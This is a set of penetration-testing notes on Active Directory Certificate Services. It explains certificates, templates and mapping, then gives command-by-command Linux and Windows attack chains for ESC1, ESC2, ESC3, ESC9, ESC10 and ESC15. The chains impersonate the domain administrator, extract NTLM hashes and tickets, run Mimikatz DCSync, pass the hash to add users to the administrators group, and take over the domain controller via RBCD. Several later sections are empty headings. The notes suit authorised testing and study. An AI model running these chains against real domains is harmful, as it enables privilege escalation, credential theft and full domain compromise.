**Active Directory Certificate Services (AD CS)** is Microsoft's PKI for Windows domains, managing certificates for authentication, encryption, and signing. A relatively new attack surface, it's become a common vector for privilege escalation and persistence when misconfigured.

>[!WARNING] Setup `/etc/hosts` or else you will hate your life. Use FQDNs where possible. If you get an NETBIOS error, refire.

**Table of Contents:**
	**Abusing Certificate Templates** (ESC1, ESC2, ESC3, ESC9, ESC10, ESC15) - flaws in certificate template configuration.
	**Abusing CA Configuration** (ESC6) - weaknesses in the Certificate Authority setup.
	**Abusing Access Control** (ESC4, ESC5, ESC7) - misconfigured permissions across AD CS objects.
	**NTLM Relay** (ESC8, ESC11) - relaying authentication to AD CS endpoints.
	**Miscellaneous ADCS Attacks** - other vectors including Certifried and PKINIT not Supported.
# ADCS Theory
`Active Directory Certificate Services (AD CS)` is a Windows server role that enables organizations to establish their own `Public Key Infrastructure (PKI)`. 
## Key Terms

| Term                                  | Definition                                                                                                                                                                                                                     |
| ------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Certificate Templates**             | Predefined configs setting a certificate's purpose, key size, validity, and issuance policy. Standard (Web Server, Code Signing) or custom.                                                                                    |
| **Public Key Infrastructure (PKI)**   | Full system (hardware, software, policies) to create, manage, distribute, and revoke certificates. Houses CAs and registration authorities.                                                                                    |
| **Certificate Authority (CA)**        | Issues certificates to users/computers/services and manages their validity.                                                                                                                                                    |
| **Certificate Enrollment**            | Process of requesting a certificate from a CA; identity is verified before issuance.                                                                                                                                           |
| **Certificate Manager**               | Handles certificate issuance/management and approves enrollment and revocation requests.                                                                                                                                       |
| **Digital Certificate**               | Electronic doc binding an identity to a public key; used for authentication.                                                                                                                                                   |
| **Certificate Revocation**            | Invalidating compromised/expired certificates via CRL or OCSP.                                                                                                                                                                 |
| **Key Management**                    | Mechanisms for securing and properly using private keys.                                                                                                                                                                       |
| **Backup Operator**                   | Role that backs up/restores files, system state, and CA data; can start/stop the AD CS service and read the CA database. Assigned via ADUC or Computer Management.                                                             |
| **Standalone CA**                     | Operates without AD; certificate requests are manual or web-based.                                                                                                                                                             |
| **Enterprise CA**                     | AD-integrated; auto-issues certificates via Group Policy or Enrollment Web Services.                                                                                                                                           |
| **Certificate Signing Request (CSR)** | Request containing a requester's public key + identity info; CA verifies it before issuing a certificate.                                                                                                                      |
| **Certificate Revocation List (CRL)** | Signed list of revoked certificates published by a CA.                                                                                                                                                                         |
| **Extended/Enhanced Key Usage (EKU)** | Extension restricting a certificate to specific uses (code signing, smart card logon, etc.). Prebuilt or custom. Defines what the certificate is allowed to be used for. It's a list of OIDs, each naming a permitted purpose. |
| **ESC**                               | Escalation                                                                                                                                                                                                                     |
## Certificates
An **X.509 certificate** is a digitally signed document used for encryption, message signing, and authentication. It binds an identity (the **Subject**) to a **key pair**, letting applications use that key pair as proof of the user's identity.

|Field|Description|
|---|---|
|**Subject**|The certificate owner's identity.|
|**Public Key**|Links the Subject to a separate private key.|
|**NotBefore / NotAfter**|Start and end dates defining validity.|
|**Serial Number**|Unique identifier assigned by the issuing CA.|
|**Issuer**|Who issued the certificate (usually a CA).|
|**SubjectAlternativeName**|Alternative identities tied to the Subject.|
|**Basic Constraints**|Whether it's a CA or end entity, plus usage limits.|
|**Extended Key Usages (EKUs)**|Permitted uses (code signing, secure email, client/server auth, smart card logon, etc.).|
|**Signature Algorithm / Signature**|Algorithm used to sign, and the signature made with the issuer's private key.|
## Certificate Authorities
`Certificate Authorities (CAs)` serve as pivotal entities responsible for the issuance of certificates.

The root CA certificate is created by the CA itself through the signing of a new certificate using its private key (it is self-signed.)

ADCS stores trusted root CA certificates in four locations under the container `CN=Public Key Services,CN=Services,CN=Configuration,DC=,DC=`.
	`Certification Authorities container`: 
		Defines top-tier root CA certs.
	`Enrollment Services container`: 
		Hosts AD objects for each Enterprise CA.
	`NTAuthCertificates AD Object`: 
		Hosts CA certs pivotal for authenticating to AD.
	`AIA (Authority Information Access) container`: 
		Hosts AD Objects representing intermediate and cross CAs.
## Certificate Templates
AD CS Enterprise `CAs` use `certificate templates` to establish certificate settings. These templates are stored as AD objects with objectClass `pKICertificateTemplate`

The `pKIExtendedKeyUsage` attribute within an AD certificate template object contains a cluster of enabled `OIDs (Object Identifier)` that impact the permissible uses of the certificate. These EKU `OIDs` encompass functionalities such as Encrypting File System, Code Signing, Smart Card Logon, and Client Authentication, etc.

These OIDs have been shown to enable authentication to AD when present in a cert.

|Description|OID|
|---|---|
|Client Authentication|1.3.6.1.5.5.7.3.2|
|PKINIT Client Authentication*|1.3.6.1.5.2.3.4|
|Smart Card Logon|1.3.6.1.4.1.311.20.2.2|
|Any Purpose|2.5.29.37.0|
|SubCA|(no EKUs)|
## Enrollment Process
The steps a client follows to obtain a certificate from an Enterprise CA:

1. **Find an Enterprise CA** — Locate a CA via objects in the Enrollment Services container.
2. **Generate keys + CSR** — Create a public-private key pair and a CSR containing the public key, template name, and subject.
3. **Sign + submit CSR** — Sign the CSR with the private key and send it to the CA.
4. **CA authorization check** — CA verifies the client is authorized, then checks the template's permissions to decide whether to issue.
5. **CA issues certificate** — If permitted, the CA builds the certificate from the template (EKUs, crypto settings, etc.), signs it with its private key, and returns it.
6. **Client receives certificate** — Stored in the Windows Certificate Store and usable per the EKU OIDs it contains.
## Issuance Requirements
Two issuance requirement settings govern enrollment. They're found in the **Issuance Requirements** tab of a template's properties  
	`certsrv.msc` > Certificate Templates > Manage

**CA certificate manager approval** : 
	Sets the `CT_FLAG_PEND_ALL_REQUESTS (0x2)` bit in the template's `msPKI-EnrollmentFlag`. All requests go to a pending state (visible under "Pending Requests" in `certsrv.msc`) and require a certificate manager to approve or deny before issuance.

**Authorized signatures + Application policy** : 
	_This number of authorized signatures_ sets how many signatures the CSR must carry for the CA to accept it.
	_Application policy_ defines which EKU OIDs the signing certificate must have.
# ADCS Enumeration
In CTFs, it is common for the ADCS server to be installed on the DC. Real-world, it is often times on an independent server.

[Certified Pre-Owned - Abusing Active Directory Certificate Services]([Certified Pre-Owned - Abusing Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf))
	ADCS attack types `ESC1 - ESC8`

`Certify` tool - Use to enumerate and exploit ADCS
	[Certify Github]([Flangvik SharpCollection repository](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/Certify.exe).)
	[Flangvik SharpCollection repository](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/Certify.exe)(pre-compiled binary)

Windows Enumeration
```powershell
# Identify ADCS Server 
net localgroup "Cert Publishers" # Server will be a member

# Enumerate using Certify
.\Certify.exe find
```

Linux Enumeration
```bash
# Identify ADCS server
netexec ldap <DC> -u "user" -p 'Password123!' -M adcs

# Enumerate using Certipy
certipy find -u 'user' -p 'Password123!' -dc-ip <DC> -stdout
```
# Abusing Certificate Templates
## ESC1
If a certificate template allows including a `subjectAltName` (SAN) different from the user making the certificate request (CSR), it would allow us to request a certificate as any user in the domain.

Abuse Requirements:
	1. Enterprise CA grants enrollment rights to low-privileged users..
	2. Manager approval should be turned off (or social engineer to bypass).
	3. No authorized signatures are required.
	4. Security descriptor of cert template must be excessively permissive.
	5. The certificate template defines EKUs that enable authentication.
	6. The certificate template allows requestors to specify `subjectAltName` in the `CSR`.

Linux POC
```bash
# Enumerate
certipy find -u '<USER>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout
	# ESC1 in [!]
	# Make note of CA

# Certificate Request with alternative SAN
certipy req -u '<USER>' -p '<PASS>' -target <CA_HOST> -ca '<CA>' -template <TEMPLATE> -upn administrator@<DOMAIN>
	# -ca <CA identified previously>
	# -upn <alernative_subject> : The subject we want to auth as
	# this should output administrator.pfx certificate

# Certificate Authentication
certipy auth -pfx administrator.pfx -username administrator -domain <domain> -dc-ip <dc_ip>
	# Should return TGT administrator.ccache AND the NTLM hash

# Connect
KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass <FQDN>
	# This way uses the TGT and wmi, but consider other ways!
```

Windows POC
```powershell
# Enumerate
.\Certify.exe find /vulnerable # Consider running context. 

# Enumerate w/ ldap instead
Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'   # Change OU

# Certificate Request with alternative SAN
.\Certify.exe request /ca:<ADCS_server.FQDN>\<CA> /template:<name> /altname:administrator@<domain>
	# copy cert.pem output and save to linux OR use OpenSSL on Windows

# Convert Certificate to pfx format
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
	# Linux
	openssl pkcs12 -in cert.pem -export -out cert.pfx

# Certificate Authentication
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /nowrap
	# Should return TGT base64(ticket.kirbi) and NTLM Hash

# Create Sacrifical Logon Session (TGT Way)
.\Rubeus.exe createnetonly /program:powershell.exe /show

# Import Base64 Ticket into PS session using Rubeus
.\Rubeus.exe ptt /ticket:doIGQjCCBj6gAwIBBaEDAgEW<SNIP>

# Example DCSync 
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Import-Module .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"lsadump::dcsync /user:lab\Administrator"'
```
## ESC2
A variation of ESC1. A certificate template defines the `Any Purpose` EKU (or no EKU at all), so the issued certificate can be used for anything: client auth, server auth, code signing, etc. If the template also allows the requestor to specify a `subjectAltName` (SAN), it is abused identically to ESC1.

If the requestor CANNOT specify a SAN, the template can still be abused as an enrollment agent to request a cert on behalf of another user, or (with no EKU / SubCA template) as a subordinate CA cert to sign new certs with arbitrary EKUs. 

>Note: SubCA-signed certs won't work for domain auth unless the SubCA is trusted by `NTAuthCertificates` (not the default).

Abuse Requirements:
1. Enterprise CA grants enrollment rights to low-privileged users.
2. Manager approval should be turned off (or social engineer to bypass).
3. No authorized signatures are required.
4. Security descriptor of cert template must be excessively permissive.
5. The certificate template defines `Any Purpose` EKU or has no EKU specified.

> **NOTES:** When the SAN-specifiable variant is present, the abuse command is identical to ESC1, so `certipy`/`Certify` won't distinguish the two. Confirm which primitive you're using from the `find` output.

Linux POC
```bash
# Enumerate
certipy find -u '<USER>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout
	# ESC2 in [!] : "template can be used for any purpose"
	# Make note of CA

# Certificate Request with alternative SAN (same as ESC1)
certipy req -u '<USER>' -p '<PASS>' -target <CA_HOST> -ca '<CA>' -template <TEMPLATE> -upn administrator@<DOMAIN>
	# -ca <CA identified previously>
	# -upn <alternative_subject> : the subject we want to auth as
	# outputs administrator.pfx

# Certificate Authentication
certipy auth -pfx administrator.pfx -username administrator -domain <domain> -dc-ip <dc_ip>
	# Should return TGT administrator.ccache AND the NTLM hash

# Connect
KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass <FQDN>
	# This way uses the TGT and wmi, but consider other ways!

```

Windows POC
```powershell
# Enumerate
.\Certify.exe find /vulnerable # Consider running context.
	# Certify won't label ESC2 specifically; look for "Any Purpose" EKU

# Enumerate w/ ldap instead
Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=lab,DC=local'   # Change OU
	# 2.5.29.37.0 = Any Purpose ; !(pkiextendedkeyusage=*) = no EKU

# Certificate Request with alternative SAN
.\Certify.exe request /ca:<ADCS_server.FQDN>\<CA> /template:<name> /altname:administrator@<domain>
	# copy cert.pem output and save to linux OR use OpenSSL on Windows

# Convert Certificate to pfx format
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
	# Linux
	openssl pkcs12 -in cert.pem -export -out cert.pfx

# Certificate Authentication
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /nowrap
	# Should return TGT base64(ticket.kirbi) and NTLM Hash

# Create Sacrificial Logon Session (TGT Way)
.\Rubeus.exe createnetonly /program:powershell.exe /show

# Import Base64 Ticket into PS session using Rubeus
.\Rubeus.exe ptt /ticket:doIGQjCCBj6gAwIBBaEDAgEW<SNIP>

# PTH with recovered NT hash (SubCA/no-SAN variant, or lateral movement)
Invoke-TheHash -Type SMBExec -Target <target> -Username Administrator -Hash <nthash> -Command "net localgroup Administrators <user> /add"

```
## ESC3
Abuses a template with the `Certificate Request Agent` EKU (OID `1.3.6.1.4.1.311.20.2.1`). This EKU lets the holder request certs on behalf of other users. Two-step: (1) enroll in the vulnerable template to get an enrollment agent cert, (2) use that cert to request an auth-capable cert (e.g. built-in `User`) on behalf of a privileged account. Result is a cert as that account, used like ESC1/2 to get a TGT / NT hash.

Requires two template conditions on the CA:
- Cond 1: low-priv enrollment, no manager approval, no auth signatures, permissive DACL, and the `Certificate Request Agent` EKU.
- Cond 2: low-priv enrollment, no manager approval, an EKU allowing domain auth, and no enrollment-agent restrictions at the CA level.

Abuse Requirements:
1. Enterprise CA grants enrollment rights to low-privileged users.
2. Manager approval should be turned off (or social engineer to bypass).
3. No authorized signatures are required.
4. Security descriptor of cert template must be excessively permissive.
5. Template 1 has the `Certificate Request Agent` EKU; a second auth-capable template (e.g. `User`) is enrollable with no CA-level enrollment-agent restrictions.

>**NOTES:** The on-behalf-of template must allow Client Authentication (`User` works). Confirm no enrollment agent restrictions on the CA or step 2 fails.

Linux POC
```bash
# Enumerate
certipy find -u '<USER>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout
	# ESC3 in [!] : "template has Certificate Request Agent EKU set"
	# Make note of CA

# Step 1: request enrollment agent cert from the vulnerable template
certipy req -u '<USER>' -p '<PASS>' -target <CA_HOST> -ca '<CA>' -template '<ESC3_TEMPLATE>'
	# outputs <user>.pfx (the enrollment agent cert)

# Step 2: request cert on behalf of admin using the agent cert
certipy req -u '<USER>' -p '<PASS>' -target <CA_HOST> -ca '<CA>' -template 'User' -on-behalf-of '<DOMAIN>\administrator' -pfx <user>.pfx
	# -on-behalf-of : SHORTDOMAIN\user (NetBIOS, not FQDN)
	# -template 'User' : any template with Client Auth EKU
	# outputs administrator.pfx

# Certificate Authentication
certipy auth -pfx administrator.pfx -username administrator -domain <domain> -dc-ip <dc_ip>
	# Should return TGT administrator.ccache AND the NTLM hash

# Connect
KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass <FQDN>
	# This way uses the TGT and wmi, but consider other ways!

```

Windows POC
```powershell
# Enumerate
.\Certify.exe find /vulnerable # Consider running context.
	# Look for pkiextendedkeyusage : Certificate Request Agent

# Step 1: request enrollment agent cert from the vulnerable template
.\Certify.exe request /ca:<ADCS_server.FQDN>\<CA> /template:<ESC3_TEMPLATE>
	# save cert.pem output

# Convert to pfx
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
	# Linux
	openssl pkcs12 -in cert.pem -export -out cert.pfx

# Step 2: request cert on behalf of admin using the agent cert
.\Certify.exe request /ca:<ADCS_server.FQDN>\<CA> /template:User /onbehalfof:<DOMAIN>\Administrator /enrollcert:cert.pfx
	# save output as admin.pem

# Convert admin cert to pfx
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in admin.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx
	# Linux
	openssl pkcs12 -in admin.pem -export -out admin.pfx

# Certificate Authentication
.\Rubeus.exe asktgt /user:<DOMAIN>\Administrator /certificate:admin.pfx /getcredentials /nowrap
	# Should return TGT base64(ticket.kirbi) and NTLM Hash

# Create Sacrificial Logon Session (TGT Way)
.\Rubeus.exe createnetonly /program:powershell.exe /show

# Import Base64 Ticket into PS session using Rubeus
.\Rubeus.exe ptt /ticket:doIGQjCCBj6gAwIBBaEDAgEW<SNIP>

# PTH with recovered NT hash
Invoke-TheHash -Type SMBExec -Target <target> -Username Administrator -Hash <nthash> -Command "net localgroup Administrators <user> /add"

```
## Certificate Mapping
Certificate mapping = how AD figures out which account an issued cert belongs to. When a user authenticates with a cert, the mapping is what ties that cert back to their account and not someone else's. Important for ESC6, ESC9, and ESC10.
### Why it exists
Microsoft added a security extension in response to CVE-2022-26923 (Certifried, found by Oliver Lyak). Before this, certs didn't carry a hard link to the account's SID, which is what those attacks abuse.

Three things to know:
- **`szOID_NTDS_CA_SECURITY_EXT`** : a cert extension that embeds the requester's `objectSid` (unique per AD object). This is the strong link.
- **`StrongCertificateBindingEnforcement`** : registry key controlling Kerberos mapping strictness.
- **`CertificateMappingMethods`** : registry key controlling Schannel mapping.

Since April 2023, "Disabled" mode is ignored. Only Compatibility and Full Enforcement count.

Two ways a cert maps to an account:
- **Explicit** : the account's `altSecurityIdentities` attribute holds the cert's identifier. Cert must be signed by a trusted CA and match that value. Strong.
- **Implicit** : the cert's SAN (UPN or DNS field) is matched against the account. Weaker, and where the abuse lives.
### Kerberos mapping (`StrongCertificateBindingEnforcement`)
| Value | Mode | Behavior |
|---|---|---|
| **0** | Disabled | SID extension not checked. Pre-patch behavior. Maps purely on UPN/SAN. |
| **1** | Compatibility (default) | Checks explicit mapping first. Falls back to SID extension; if absent, allows only if the account predates the cert. |
| **2** | Full Enforcement | Checks explicit mapping, then SID extension. No extension = auth refused. |

Why value 0 matters for abuse: with a UPN cert, the KDC tries to match `userPrincipalName`, then falls back to `sAMAccountName`, then retries with a `$` appended, so a UPN cert can map to a machine account. With a DNS cert, it splits `user.domain.local` into user + domain, validates the domain, then matches the user part with a `$` appended. This loose fallback is the what ESC9/10 abuse.

At values 1 or 2, the SID extension does the mapping via `objectSid`. At 1 with no extension present, it degrades to value-0 behavior.
### Schannel mapping (`CertificateMappingMethods`)
Bitmask, combine values:
- `0x0001` : Subject/issuer explicit
- `0x0002` : Issuer explicit
- `0x0004` : SAN implicit
- `0x0008` : S4USelf implicit Kerberos
- `0x0010` : S4USelf explicit Kerberos

Default is `0x18` (`0x8` + `0x10`). Schannel can't read the SID extension directly, but it "converts" its mapping to Kerberos via S4USelf, then maps as above. If cert auth breaks, Microsoft's official fix is to set this back to the old `0x1f`, which re-enables the weak implicit methods (and the attack surface).
## ESC9
Hinges on the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the template's `msPKI-Enrollment-Flag`. When set, the CA omits the `szOID_NTDS_CA_SECURITY_EXT` extension, which is the piece that embeds the requester's objectSID into the cert.

No embedded SID means strong certificate mapping can't happen. Even with `StrongCertificateBindingEnforcement = 1` (the default), the KDC falls back to mapping by UPN alone, exactly as if the key were `0`. 

If you can write to a user's UPN (need `GenericWrite`/`GenericAll` ), you set the UPN A to match your target B. You enroll as A against the vulnerable template. Because the cert carries no SID and only the UPN, the resulting cert maps to B, not A. Authenticate, get B's TGT and hash.

How to tell?
	The tell in the Certipy output is `Certificate has no object SID`.

Requirements:
1. `StrongCertificateBindingEnforcement != 2`, OR `CertificateMappingMethods` contains the UPN flag (`0x4`). Same registry keys from your mapping theory section.
2. Template has `NO_SECURITY_EXTENSION` in `msPKI-Enrollment-Flag`.
3. Template allows Client Authentication.
4. `GenericWrite` (or better) over account A to compromise account B.

Linux POC
```bash
# Identify vulnerable template
certipy find -u '<USER>' -p 'Password123!' -dc-ip <IP> -vulnerable -stdout
	# ESC9

# We need a user we can AUTHENTICATE with (user), full control over ANY user (user2), and a TARGET user we want to compromise (user3).
# Use DACLEDIT to enumerate uer rights
dacledit.py -action read -dc-ip <dc_ip> domain/user:Password123! -principal <user> -target <user2>
	# Access mask : FullControl

# Retrieve user2 NT Hash via Shadow Credentials
certipy shadow auto -u '<user>@<domain>' -p 'Password123!' -account user2
	# Make note of NT hash

# Change user2 UPT to user3
certipy account update -u '<user>@<domain>' -p 'Password123!' -user user2 -upn user3@domain

# Request vulnerable certipy with user2
certipy req -u 'user2@domain' -hashes <user2_hash> -ca <ca_name> -template <template_name>
	# user3.pfx

# Revert changes of user2 (DON'T SKIP - required to work)
certipy account update -u '<user>@<domain>' -p 'Password123!' -user user2 -upn user2@domain

# Authenticate as user3
certipy auth -pfx user3.pfx -domain domain -dc-ip <dc_ip>
	# Make note of NT Hash
```

Windows POC
```powershell
# Enumerate vulnerable template
.\Certify.exe find
	# Look for: mspki-enrollment-flag : NO_SECURITY_EXTENSION + Client Authentication EKU

# Confirm registry conditions (only if you have access to the ADCS server)
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc
	# StrongCertificateBindingEnforcement != 2  (default 1)
reg query HKLM\System\CurrentControlSet\Control\SecurityProviders\Schannel\
	# OR CertificateMappingMethods contains 0x4 (UPN flag)

# We need a user we can AUTHENTICATE with (user), full control over ANY user (user2), and a TARGET user (user3).
# Find accounts we have GenericWrite/GenericAll over
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Import-Module .\PowerView.ps1
$user=(Get-DomainUser -Identity <user>)
Get-DomainObjectAcl -LDAPFilter "(&(objectClass=user)(objectCategory=person))" -ResolveGUIDs | ? {($_.ActiveDirectoryRights -contains "GenericAll" -or $_.ActiveDirectoryRights -contains "GenericWrite") -and $_.SecurityIdentifier -eq $user.objectsid}
	# ObjectDN CN=User2 ... ActiveDirectoryRights : GenericAll

# Reset user2's password (Certify can't take creds, so we need a real session as user2)
Set-DomainUserPassword -Identity user2 -AccountPassword $((ConvertTo-SecureString 'Newpassword123!' -AsPlainText -Force)) -Verbose

# Change user2 UPN to match user3
Set-DomainObject user2 -Set @{'userPrincipalName'='user3@domain'} -Verbose

# Get a session as user2 (RDP / RunasCS / runas), then confirm context
# xfreerdp /u:user2 /p:'Newpassword123!' /d:domain /v:<IP>
whoami
	# domain\user2

# Request cert as user2 with altname user3
.\Certify.exe request /ca:<ca_name> /template:<template_name> /altname:user3
	# Save cert.pem output -> user3.pem

# Convert PEM to PFX
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in .\user3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out user3.pfx
	# OR from linux
	openssl pkcs12 -in user3.pem -export -out user3.pfx

# (Revert user2 UPN back to clean up)
Set-DomainObject user2 -Set @{'userPrincipalName'='user2@domain'} -Verbose

# Request TGT as user3 + pull NT hash
.\Rubeus.exe asktgt /user:user3 /certificate:user3.pfx /getcredentials /nowrap
	# NTLM : <user3_hash>
```
## ESC10
The `ESC10` abuse case is similar to the previous `ESC9` but focuses on misconfigurations in registry keys rather than template configurations.

Case 1 - Kerberos - `StrongCertificateBindingEnforcement = 0x0`
	Strong mapping is off entirely, so the KDC maps by UPN during PKINIT. You swap A's UPN to the target, enroll, revert, then auth normally via Kerberos, exactly like ESC9's auth step.

Case 2 - Schannel - `CertificateMappingMethods = 0x4` 
	The weak mapping is on the Schannel path, not Kerberos. So you can't PKINIT with the cert, you authenticate over Schannel (`-ldap-shell`). Critical constraint: the target B must have no existing UPN, otherwise you hit a constraint violation swapping A's UPN to match. That means Case 2 targets machine accounts (`dc$`) or the built-in Administrator. That naturally chains into RBCD, since you land as the DC machine account.

How to tell?  
	No tool flags ESC10 outright. You confirm by reading the registry from the DC (admin needed), or you just try the attack. Case 1: `StrongCertificateBindingEnforcement = 0x0`. Case 2: `CertificateMappingMethods = 0x4`.

Requirements - Case 1:
1. `StrongCertificateBindingEnforcement = 0` (only honored if April 2023 updates not installed).
2. At least one template allows Client Authentication (e.g. built-in `User`).
3. `GenericWrite` over account A to compromise account B.

Requirements - Case 2:
1. `CertificateMappingMethods = 0x4`.
2. At least one template allows Client Authentication (e.g. built-in `User`).
3. `GenericWrite` over A to compromise B, where **B has no UPN set** (machine accounts, built-in Administrator).

Linux POC - Case 1 (Kerberos)
```bash
# Confirm reg key (needs DC admin — otherwise just try the attack)
reg.py 'domain'/'Administrator':'Password123!'@<dc_ip> query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\Kdc'
	# StrongCertificateBindingEnforcement REG_DWORD 0x0

# Grab user2's hash without disrupting them
certipy shadow auto -u '<user>@<domain>' -p 'Password123!' -account user2
	# Make note of NT hash

# Swap user2 UPN to the target (here: Administrator)
certipy account update -u '<user>@<domain>' -p 'Password123!' -user user2 -upn administrator@domain

# Request cert on ANY client-auth template (built-in User)
certipy req -u 'user2@<domain>' -hashes <user2_hash> -ca <ca_name> -template User
	# administrator.pfx  (note: this one HAS an object SID, unlike ESC9)

# Revert user2 UPN — REQUIRED before auth so administrator@domain resolves to the real admin
certipy account update -u '<user>@<domain>' -p 'Password123!' -user user2 -upn user2@domain

# Auth as Administrator via Kerberos
certipy auth -pfx administrator.pfx -username administrator -domain domain -dc-ip <dc_ip>
	# Make note of NT hash
```

Linux POC - Case 2 (Schannel → RBCD)
```bash
# Confirm reg key (needs DC admin)
reg.py 'domain'/'Administrator':'Password123!'@<dc_ip> query -keyName 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL'
	# CertificateMappingMethods REG_DWORD 0x4

# Grab user2's hash
certipy shadow auto -u '<user>@<domain>' -p 'Password123!' -account user2
	# Make note of NT hash

# Swap user2 UPN to the DC machine account (target MUST have no UPN)
# use nxc -computers to get machine account names
certipy account update -u '<user>@<domain>' -p 'Password123!' -user user2 -upn '<dc$_account>@<domain>'

# Request cert on any client-auth template
certipy req -u 'user2@domain' -hashes <user2_hash> -ca <ca_name> -template User
	# dc.pfx

# Revert user2 UPN
certipy account update -u '<user>@<domain>' -p 'Password123!' -user user2 -upn user2@domain

# Can't PKINIT — auth over Schannel into an LDAP shell (running as DC$)
certipy auth -pfx <dc.pfx> -domain <domain> -dc-ip <dc_ip> -ldap-shell
	# Authenticated as: u:DOMAIN\DC$

# --- inside the LDAP shell ---
add_computer pwned plaintext123 # creates pwned$ / plaintext123
set_rbcd <dc$> pwned$ # pwned$ can now impersonate on dc via S4U2Proxy
exit

# Impersonate Administrator via RBCD
getST.py -spn cifs/<DC>.<DOMAIN> -impersonate Administrator -dc-ip <dc_ip> domain/'pwned$':plaintext123
	# Administrator.ccache
	# If KRB_AP_ERR_BADMATCH: unset KRB5CCNAME

# Use the ticket
KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass DC.DOMAIN
```


## ESC15
Also known as "EKUwu" (research by Justin Bollinger, TrustedSec) and tracked as CVE-2024-49019. Affects unpatched CAs and lets an attacker inject arbitrary Application Policies into a certificate issued from a Version 1 (Schema V1) certificate template. Because the injected policy can be Client Authentication or Certificate Request Agent, a template that never intended to allow auth becomes an ESC1 or ESC3 primitive.

Abuse Requirements:
1. `Enrollee Supplies Subject` is True.
2. Schema Version is 1.
3. CA not patched for CVE-2024-49019.

>**NOTES:** `-application-policies` is native in Certipy v5. Method 1 injects Client Auth for a direct ESC1-style impersonation. If that fails (e.g. the resulting cert can't PKINIT), fall back to Method 2, which injects the enrollment agent policy and pivots on-behalf-of like ESC3.

Method 1 - If this fails, try method 2
```bash
# Inject Client Auth policy and specify SAN
certipy req -u <user> -p '<password>' -dc-ip <dc_ip> -target <target_hostname> -ca <ca_name> -template <template_name> -upn administrator@<domain> -application-policies 'Client Authentication'
	# outputs administrator.pfx

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
	# Should return TGT administrator.ccache AND the NTLM hash
```

Method 2
```bash
# Inject enrollment agent policy on cert for compromised user
certipy req -u <user> -p '<password>' -dc-ip <dc_ip> -target <target_hostname> -ca <ca_name> -template <template_name> -upn <user>@<domain> -application-policies 'Certificate Request Agent'
	# outputs <user>.pfx (the enrollment agent cert)

# Use it to request a cert on behalf of admin from an auth template
certipy req -u <user> -p '<password>' -dc-ip <dc_ip> -target <target_hostname> -ca <ca_name> -template User -pfx <user>.pfx -on-behalf-of '<domain>\Administrator'
	# outputs administrator.pfx

# Auth as administrator
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
	# Should return TGT administrator.ccache AND the NTLM hash
```
# Abusing CA Configuration
# Abusing Access control
# NTLM Relay Attacks
# Miscellaneous ADCS Attacks

